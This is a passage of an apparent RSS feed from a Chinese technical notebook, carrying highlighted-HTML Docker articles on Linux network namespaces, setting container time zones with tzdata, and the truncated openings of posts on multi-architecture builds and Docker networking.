<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  [</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">plugins</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"io</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">containerd</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cri</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">v1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">images"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">registry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    config_path</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"/etc/containerd/certs.d"</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  [</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">plugins</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"io</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">containerd</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cri</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">v1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">images"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">image_decryption</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    key_model</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> = </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"node"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>为Docker分配物理网卡</title>
      <link>https://www.geekery.cn/note-book/Docker/%E4%B8%BADocker%E5%88%86%E9%85%8D%E7%89%A9%E7%90%86%E7%BD%91%E5%8D%A1.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E4%B8%BADocker%E5%88%86%E9%85%8D%E7%89%A9%E7%90%86%E7%BD%91%E5%8D%A1.html</guid>
      <source url="https://www.geekery.cn/rss.xml">为Docker分配物理网卡</source>
      <description>为Docker分配物理网卡 Docker内部使用了Net namespace进行网络隔离，我们也可以利用这种底层的特性来魔改容器。 运行中的容器都对应一个PID，每个PID都有自己的名称空间，它的名称空间在 /proc/[PID]/ns 下 namespace都是链接文件，格式为xxx:[inode number]。 Kubernests的Pod 的S...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>Docker内部使用了Net namespace进行网络隔离，我们也可以利用这种底层的特性来魔改容器。</p>
</blockquote>
<p>运行中的容器都对应一个PID，每个PID都有自己的名称空间，它的名称空间在 /proc/[PID]/ns 下</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ls</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -lah</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /proc/2047/ns/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">total</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">dr-x--x--x</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:41</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">dr-xr-xr-x</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 9</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:41</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ..</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cgroup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'cgroup:[4026532459]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ipc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'ipc:[4026532343]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mnt</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'mnt:[4026532341]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:41</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> net</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'net:[4026532400]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'pid:[4026532344]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:52</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pid_for_children</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'pid:[4026532344]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'time:[4026531834]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:52</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time_for_children</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'time:[4026531834]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> user</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'user:[4026531837]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> uts</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'uts:[4026532342]'</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>namespace都是链接文件，格式为xxx:[inode number]。</p>
<p>Kubernests的Pod 的SideCar机制也是利用了这种特性，有选择的打通pause容器和其他容器之间的名称空间。</p>
<p>在系统层来看的话，就是每个sidecar内的容器使用了同一个net namespace inode的名称空间，这样他们的资源就实现了共享。</p>
<p>既然每个进程都有名称空间，那么pid为1的init进程也拥有自己的名称空间，就是系统开机之后使用的名称空间，所有的物理网卡也在这个名称空间下。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/proc/1/ns/net</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>只使用操作系统创建容器-扫描</title>
      <link>https://www.geekery.cn/note-book/Docker/%E5%8F%AA%E4%BD%BF%E7%94%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%9B%E5%BB%BA%E5%AE%B9%E5%99%A8-%E6%89%AB%E6%8F%8F.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E5%8F%AA%E4%BD%BF%E7%94%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%88%9B%E5%BB%BA%E5%AE%B9%E5%99%A8-%E6%89%AB%E6%8F%8F.html</guid>
      <source url="https://www.geekery.cn/rss.xml">只使用操作系统创建容器-扫描</source>
      <description>只使用操作系统创建容器-扫描 手写笔记 docker</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>手写笔记</h2>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>在Dockerfile里调整时区</title>
      <link>https://www.geekery.cn/note-book/Docker/%E5%9C%A8Dockerfile%E9%87%8C%E8%B0%83%E6%95%B4%E6%97%B6%E5%8C%BA.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E5%9C%A8Dockerfile%E9%87%8C%E8%B0%83%E6%95%B4%E6%97%B6%E5%8C%BA.html</guid>
      <source url="https://www.geekery.cn/rss.xml">在Dockerfile里调整时区</source>
      <description>在Dockerfile里调整时区 docker已运行容器里的时区修改 在docker container 中不能自动识别宿主机的时区，可通过安装tzdata软件包，配置TZ环境变量识别正确时区． 使用tzdata设置时区dpkg-reconfigure tzdata 当在个性化需求是可在docker run命令或docker-compose文件增加环境...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>docker已运行容器里的时区修改</h2>
<div class="language-yaml line-numbers-mode" data-highlighter="shiki" data-ext="yaml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-yaml"><span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ln -sf /usr/share/zoneinfo/Asia/Shanghai    /etc/localtime</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">或者</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">cp /usr/share/zoneinfo/Asia/Shanghai    /etc/localtime</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">重启容器即可</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> # 创建并运行容器，通过 -e TZ="Asia/Shanghai" 设置时区 docker run -e TZ="Asia/Shanghai" -d -p 80:80 --name nginx nginx</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在docker container 中不能自动识别宿主机的时区，可通过安装tzdata软件包，配置TZ环境变量识别正确时区．
使用tzdata设置时区<code>dpkg-reconfigure tzdata</code></p>
<div class="language-dockerfile line-numbers-mode" data-highlighter="shiki" data-ext="dockerfile" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-dockerfile"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># for ubuntu </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">RUN</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> apt-get update &amp;&amp; apt-get install -y --no-install-recommends tzdata  &amp;&amp; rm -rf /var/lib/apt/lists/*</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ENV</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> TZ Asia/Shanghai</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># for alpine</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">RUN</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> apk add --no-cache tzdata</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ENV</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> TZ Asia/Shanghai</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当在个性化需求是可在docker run命令或docker-compose文件增加环境变量 -e TZ=Asia/Shanghai(其他时区)</p>
<p>本人测试文件
ubuntu/Dockerfile</p>
<div class="language-dockerfile line-numbers-mode" data-highlighter="shiki" data-ext="dockerfile" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-dockerfile"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">FROM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ubuntu</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">RUN</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> apt update &amp;&amp; apt install -y tzdata</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ENV</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> TZ Asia/Shanghai</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WORKDIR</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> /app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">COPY</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> . /app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ENV</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> NAME World</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>alpine/Dockerfile</p>
<div class="language-dockerfile line-numbers-mode" data-highlighter="shiki" data-ext="dockerfile" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-dockerfile"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">FROM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> python:3.6-alpine</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WORKDIR</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> /app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">COPY</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> . /app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ENV</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> NAME World</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">RUN</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> apk add --no-cache tzdata</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ENV</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> TZ Asia/Shanghai</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">CMD</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"python"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"app.py"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>测试用的复制粘贴</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> t-u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  study_days/docker/ubuntu</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> t-a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  study_days/docker/alpine</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --entrypoint</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /bin/sh</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> t-a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --entrypoint</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /bin/bash</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> t-s</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># tzdata 设置时区</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">dpkg-reconfigure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tzdata</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>在x86-64上构建和运行多种架构的Docker容器</title>
      <link>https://www.geekery.cn/note-book/Docker/%E5%9C%A8x86-64%E4%B8%8A%E6%9E%84%E5%BB%BA%E5%92%8C%E8%BF%90%E8%A1%8C%E5%A4%9A%E7%A7%8D%E6%9E%B6%E6%9E%84%E7%9A%84Docker%E5%AE%B9%E5%99%A8.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E5%9C%A8x86-64%E4%B8%8A%E6%9E%84%E5%BB%BA%E5%92%8C%E8%BF%90%E8%A1%8C%E5%A4%9A%E7%A7%8D%E6%9E%B6%E6%9E%84%E7%9A%84Docker%E5%AE%B9%E5%99%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">在x86-64上构建和运行多种架构的Docker容器</source>
      <description>在x86-64上构建和运行多种架构的Docker容器 支持Docker Desktop 和 Linux Docker CE 配置多架构构建环境 安装CPU指令集模拟平台 相关信息 安装新版CPU指令集模拟平台 相关信息 使用老版本的模拟器在arm64下出现sudo无法使用的问题，使用新版本可以使用。 https://github.com/tonisti...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>支持Docker Desktop 和 Linux Docker CE</p>
</blockquote>
<h2>配置多架构构建环境</h2>
<h3>安装CPU指令集模拟平台</h3>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>| 名称                 | 功能描述             | 作用                                                         | 关联场景或示例                                               |
|</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>手撕Docker网络</title>
      <link>https://www.geekery.cn/note-book/Docker/%E6%89%8B%E6%92%95Docker%E7%BD%91%E7%BB%9C.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E6%89%8B%E6%92%95Docker%E7%BD%91%E7%BB%9C.html</guid>
      <source url="https://www.geekery.cn/rss.xml">手撕Docker网络</source>
      <description>手撕Docker网络 docker网络使用的是iptables实现 docker0是个网桥 veth-pair技术绑定和跨越netns 前提 本文并非小白所看懂的,有一定的门槛，如果不熟悉以下的前提，你可能看不懂本文，如果有什么困难请巩固基础，前提如下： 熟练使用iptables基本模块 熟练使用docker命令 熟练使用基本的docker网络 懂基本...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>docker网络使用的是iptables实现</p>
<p>docker0是个网桥</p>
<p>veth-pair技术绑定和跨越netns</p>
</blockquote>
<h1>前提</h1>
<blockquote>
